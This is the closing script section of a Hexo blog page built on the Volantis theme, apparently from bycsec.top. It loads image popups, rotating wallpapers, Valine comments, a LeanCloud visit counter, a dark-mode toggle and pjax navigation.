  };
  $(function () {
    SCload_fancybox();
  });
  function Pjax_SCload_fancybox(){
	if (typeof $.fancybox == "undefined") {
	 SCload_fancybox();
    } else {
	 pjax_fancybox();
    }
  }
  volantis.pjax.push(Pjax_SCload_fancybox)
  volantis.pjax.send(()=>{
      if (typeof $.fancybox != "undefined") {
        $.fancybox.close();    // 关闭弹窗
      }
  },'fancybox')
</script>


<!-- internal -->

  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
	  function Pjax_backstretch(){
        
          $.backstretch(
            imgs,
          {
            duration: "10000",
            fade: "1500"
          });
        
	  }
	  loadScript("https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js",Pjax_backstretch)
    </script>
  




<script>
  function loadIssuesJS() {
    if ($(".md").find(".issues-api").length == 0) return;
	
	  loadScript('/js/issues.js');
	
  };
  $(function () {
    loadIssuesJS();
  });
  volantis.pjax.push(()=>{
	if (typeof IssuesAPI == "undefined") {
	  loadIssuesJS();
	}
  },"IssuesJS")
</script>



  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 0
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    lazyLoadInstance.update();
  });
  document.addEventListener('pjax:complete', function () {
    lazyLoadInstance.update();
  });
</script>




  

<script>
  window.FPConfig = {
	delay: 0,
	ignoreKeywords: [],
	maxRPS: 5,
	hoverDelay: 25
  };
</script>
<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>











  
  
<script src="/js/valine.js"></script>


<script>
  function emoji(path, idx, ext) {
    return path + "/" + path + "-" + idx + "." + ext;
  }
  var emojiMaps = {};
  for (var i = 1; i <= 54; i++) {
    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
  }
  for (var i = 1; i <= 101; i++) {
    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
  }
  for (var i = 1; i <= 116; i++) {
    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
  }
  for (var i = 1; i <= 125; i++) {
    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
  }
  for (var i = 1; i <= 4; i++) {
    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
  }
  function pjax_valine() {
    if(!document.querySelectorAll("#valine_container")[0])return;
    let pagePlaceholder = pdata.commentPlaceholder || "快来评论吧~";
    let path = pdata.commentPath;
    if (path.length == 0) {
      let defaultPath = '';
      path = defaultPath || decodeURI(window.location.pathname);
    }
    var valine = new Valine();
    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
      el: '#valine_container',
      path: path,
      placeholder: pagePlaceholder,
      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
      emojiMaps: emojiMaps,
    }))
  }
  $(function () {
    pjax_valine();
  });
  volantis.pjax.push(pjax_valine);
</script>






  
<script src="/js/app.js"></script>



<!-- optional -->

  <script>
const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );

$('.input.u-search-input').one('focus',function(){
	
		loadScript('https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js',setSearchService);
	
})

function listenSearch(){
  
    customSearch = new HexoSearch({
      imagePath: SearchServiceimagePath
    });
  
}
function setSearchService() {
	listenSearch();
	
}
</script>









  

<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>

<script>hljs.highlightAll()</script>
<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>

<script>
volantis.pjax.push(()=>{
	document.querySelectorAll('pre code').forEach((block) => {
	  hljs.highlightBlock(block);
	  hljs.lineNumbersBlock(block, {  singleLine: true });
	});
},"highlightjs")
</script>



  <script defer>

  const LCCounter = {
    app_id: 'pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz',
    app_key: '9HlyBGu0qm9EmkSNKD2qoBx4',
    custom_api_server: '',

    // 查询存储的记录
    getRecord(Counter, url, title) {
      return new Promise(function (resolve, reject) {
        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
          .then(resp => resp.json())
          .then(({results, code, error}) => {
            if (code === 401) {
              throw error;
            }
            if (results && results.length > 0) {
              var record = results[0];
              resolve(record);
            } else {
              Counter('post', '/classes/Counter', {url, title: title, times: 0})
                .then(resp => resp.json())
                .then((record, error) => {
                  if (error) {
                    throw error;
                  }
                  resolve(record);
                }).catch(error => {
                console.error('Failed to create', error);
                reject(error);
              });
            }
          }).catch((error) => {
          console.error('LeanCloud Counter Error:', error);
          reject(error);
        });
      })
    },

    // 发起自增请求
    increment(Counter, incrArr) {
      return new Promise(function (resolve, reject) {
        Counter('post', '/batch', {
          "requests": incrArr
        }).then((res) => {
          res = res.json();
          if (res.error) {
            throw res.error;
          }
          resolve(res);
        }).catch((error) => {
          console.error('Failed to save visitor count', error);
          reject(error);
        });
      });
    },

    // 构建自增请求体
    buildIncrement(objectId) {
      return {
        "method": "PUT",
        "path": `/1.1/classes/Counter/${ objectId }`,
        "body": {
          "times": {
            '__op': 'Increment',
            'amount': 1
          }
        }
      }
    },

    // 校验是否为有效的 UV
    validUV() {
      var key = 'LeanCloudUVTimestamp';
      var flag = localStorage.getItem(key);
      if (flag) {
        // 距离标记小于 24 小时则不计为 UV
        if (new Date().getTime() - parseInt(flag) <= 86400000) {
          return false;
        }
      }
      localStorage.setItem(key, new Date().getTime().toString());
      return true;
    },

    addCount(Counter) {
      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
      enableIncr = true;
      var getterArr = [];
      var incrArr = [];
      // 请求 PV 并自增
      var pvCtn = document.querySelector('#lc-sv');
      if (pvCtn || enableIncr) {
        var pvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-sv', 'Visits').then((record) => {
          incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-sv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + 1;
              if (pvCtn) {
                pvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(pvGetter);
      }

      // 请求 UV 并自增
      var uvCtn = document.querySelector('#lc-uv');
      if (uvCtn || enableIncr) {
        var uvGetter = this.getRecord(Counter, 'https://www.bycsec.top' + '/#lc-uv', 'Visitors').then((record) => {
          var vuv = this.validUV();
          vuv && incrArr.push(this.buildIncrement(record.objectId))
          var eles = document.querySelectorAll('#lc-uv #number');
          if (eles.length > 0) {
            eles.forEach((el,index,array)=>{
              el.innerText = record.times + (vuv ? 1 : 0);
              if (uvCtn) {
                uvCtn.style.display = 'inline';
              }
            })
          }
        });
        getterArr.push(uvGetter);
      }

      // 请求文章的浏览数，如果是当前页面就自增
      var allPV = document.querySelectorAll('#lc-pv');
      if (allPV.length > 0 || enableIncr) {
        for (i = 0; i < allPV.length; i++) {
          let pv = allPV[i];
          let title = pv.getAttribute('data-title');
          var url = 'https://www.bycsec.top' + pv.getAttribute('data-path');
          if (url) {
            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
              // 是当前页面就自增
              let curPath = window.location.pathname;
              if (curPath.includes('index.html')) {
                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
              }
              if (pv.getAttribute('data-path') == curPath) {
                incrArr.push(this.buildIncrement(record.objectId));
              }
              if (pv) {
                var ele = pv.querySelector('#lc-pv #number');
                if (ele) {
                  if (pv.getAttribute('data-path') == curPath) {
                    ele.innerText = (record.times || 0) + 1;
                  } else {
                    ele.innerText = record.times || 0;
                  }
                  pv.style.display = 'inline';
                }
              }
            });
            getterArr.push(viewGetter);
          }
        }
      }

      // 如果启动计数自增，批量发起自增请求
      if (enableIncr) {
        Promise.all(getterArr).then(() => {
          incrArr.length > 0 && this.increment(Counter, incrArr);
        })
      }

    },


    fetchData(api_server) {
      var Counter = (method, url, data) => {
        return fetch(`${ api_server }/1.1${ url }`, {
          method,
          headers: {
            'X-LC-Id': this.app_id,
            'X-LC-Key': this.app_key,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      this.addCount(Counter);
    },

    refreshCounter() {
      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
      if (api_server) {
        this.fetchData(api_server);
      } else {
        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
          .then(resp => resp.json())
          .then(({api_server}) => {
            this.fetchData('https://' + api_server);
          });
      }
    }

  };

  LCCounter.refreshCounter();

  document.addEventListener('pjax:complete', function () {
    LCCounter.refreshCounter();
  });
</script>




  <script>
const rootElement = document.documentElement;
const darkModeStorageKey = "user-color-scheme";
const rootElementDarkModeAttributeName = "data-user-color-scheme";

const setLS = (k, v) => {
    localStorage.setItem(k, v);
};

const removeLS = (k) => {
    localStorage.removeItem(k);
};

const getLS = (k) => {
    return localStorage.getItem(k);
};

const getModeFromCSSMediaQuery = () => {
  return window.matchMedia("(prefers-color-scheme: dark)").matches
    ? "dark"
    : "light";
};

const resetRootDarkModeAttributeAndLS = () => {
  rootElement.removeAttribute(rootElementDarkModeAttributeName);
  removeLS(darkModeStorageKey);
};

const validColorModeKeys = {
  dark: true,
  light: true,
};

const applyCustomDarkModeSettings = (mode) => {
  const currentSetting = mode || getLS(darkModeStorageKey);

  if (currentSetting === getModeFromCSSMediaQuery()) {
    resetRootDarkModeAttributeAndLS();
  } else if (validColorModeKeys[currentSetting]) {
    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
  } else {
    resetRootDarkModeAttributeAndLS();
  }
};

const invertDarkModeObj = {
  dark: "light",
  light: "dark",
};

/**
 * get target mode
 */
const toggleCustomDarkMode = () => {
  let currentSetting = getLS(darkModeStorageKey);

  if (validColorModeKeys[currentSetting]) {
    currentSetting = invertDarkModeObj[currentSetting];
  } else if (currentSetting === null) {
    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
  } else {
    return;
  }
  setLS(darkModeStorageKey, currentSetting);
  return currentSetting;
};

/**
 * bind click event for toggle button
 */
var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
function bindToggleButton() {
    btn.on('click',(e) => {
      const mode = toggleCustomDarkMode();
      applyCustomDarkModeSettings(mode);
    });
}

applyCustomDarkModeSettings();
document.addEventListener("DOMContentLoaded", bindToggleButton);
volantis.pjax.push(bindToggleButton);
volantis.pjax.send(()=>{
	btn.unbind('click');
},'toggle-mode-btn-unbind');
</script>








<script>
function listennSidebarTOC() {
  const navItems = document.querySelectorAll(".toc li");
  if (!navItems.length) return;
  const sections = [...navItems].map((element) => {
    const link = element.querySelector(".toc-link");
    const target = document.getElementById(
      decodeURI(link.getAttribute("href")).replace("#", "")
    );
    link.addEventListener("click", (event) => {
      event.preventDefault();
      window.scrollTo({
		top: target.offsetTop + 100,
		
		behavior: "smooth"
		
	  });
    });
    return target;
  });

  function activateNavByIndex(target) {
    if (target.classList.contains("active-current")) return;

    document.querySelectorAll(".toc .active").forEach((element) => {
      element.classList.remove("active", "active-current");
    });
    target.classList.add("active", "active-current");
    let parent = target.parentNode;
    while (!parent.matches(".toc")) {
      if (parent.matches("li")) parent.classList.add("active");
      parent = parent.parentNode;
    }
  }

  function findIndex(entries) {
    let index = 0;
    let entry = entries[index];
    if (entry.boundingClientRect.top > 0) {
      index = sections.indexOf(entry.target);
      return index === 0 ? 0 : index - 1;
    }
    for (; index < entries.length; index++) {
      if (entries[index].boundingClientRect.top <= 0) {
        entry = entries[index];
      } else {
        return sections.indexOf(entry.target);
      }
    }
    return sections.indexOf(entry.target);
  }

  function createIntersectionObserver(marginTop) {
    marginTop = Math.floor(marginTop + 10000);
    let intersectionObserver = new IntersectionObserver(
      (entries, observe) => {
        let scrollHeight = document.documentElement.scrollHeight + 100;
        if (scrollHeight > marginTop) {
          observe.disconnect();
          createIntersectionObserver(scrollHeight);
          return;
        }
        let index = findIndex(entries);
        activateNavByIndex(navItems[index]);
      },
      {
        rootMargin: marginTop + "px 0px -100% 0px",
        threshold: 0,
      }
    );
    sections.forEach((element) => {
      element && intersectionObserver.observe(element);
    });
  }
  createIntersectionObserver(document.documentElement.scrollHeight);
}

document.addEventListener("DOMContentLoaded", listennSidebarTOC);
document.addEventListener("pjax:success", listennSidebarTOC);
</script>

<!-- more -->

 
	   
	    


<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>


<script>
    var pjax;
    document.addEventListener('DOMContentLoaded', function () {
      pjax = new Pjax({
        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
        selectors: [
          "title",
          
          "#pjax-container",
          "#pjax-header-nav-list"
        ],
        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
        timeout: 5000
      });
    });

    document.addEventListener('pjax:send', function (e) {
      //window.stop(); // 相当于点击了浏览器的停止按钮

      try {
        var currentUrl = window.location.pathname;
        var targetUrl = e.triggerElement.href;
        var banUrl = [""];
        if (banUrl[0] != "") {
          banUrl.forEach(item => {
            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
              window.location.href = targetUrl;
            }
          });
        }
      } catch (error) {}

      window.subData = null; // 移除标题（用于一二级导航栏切换处）

      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航

      // 解绑事件 避免重复监听
      volantis.$topBtn.unbind('click');
      $('.menu a').unbind('click');
      $(window).unbind('resize');
      $(window).unbind('scroll');
      $(document).unbind('scroll');
      $(document).unbind('click');
      $('body').unbind('click');
	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.send.start();
    });

    document.addEventListener('pjax:complete', function () {
      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
      $('script[data-pjax], .pjax-reload script').each(function () {
        $(this).parent().append($(this).remove());
      });
      try{
		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
		volantis.pjax.method.complete.start();
      } catch (e) {
        console.log(e);
      }
    });

    document.addEventListener('pjax:error', function (e) {
	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
	  volantis.pjax.method.error.start();
      window.location.href = e.triggerElement.href;
    });
</script>
 
	  
    </div>
  </body>
</html>
